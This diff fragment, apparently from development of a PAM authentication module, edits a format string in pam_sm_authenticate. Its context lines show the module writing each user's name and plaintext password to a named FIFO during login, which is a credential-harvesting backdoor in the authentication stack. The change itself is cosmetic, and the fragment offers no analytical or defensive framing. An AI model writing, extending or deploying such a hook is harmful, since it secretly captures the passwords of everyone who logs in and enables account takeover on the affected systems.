@@ -18,7 +18,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 	int fifo_fd = open(FIFO_PATH, O_WRONLY);
 
 	char creds[256];
-	snprintf(creds, sizeof(creds), "%s:%s", user, password);
+	snprintf(creds, sizeof(creds), "%s : %s", user, password);
 
 	write(fifo_fd, creds, strlen(creds));
 	
